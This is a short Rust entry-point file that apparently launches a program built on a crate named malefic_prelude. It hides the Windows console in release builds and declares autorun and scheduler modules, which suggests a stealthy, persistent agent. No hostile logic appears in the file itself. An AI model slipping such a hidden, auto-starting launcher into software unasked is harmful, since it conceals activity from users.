#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use malefic_prelude::run;

pub mod autorun;
pub mod scheduler;

fn main() -> anyhow::Result<()> {
    run()
}
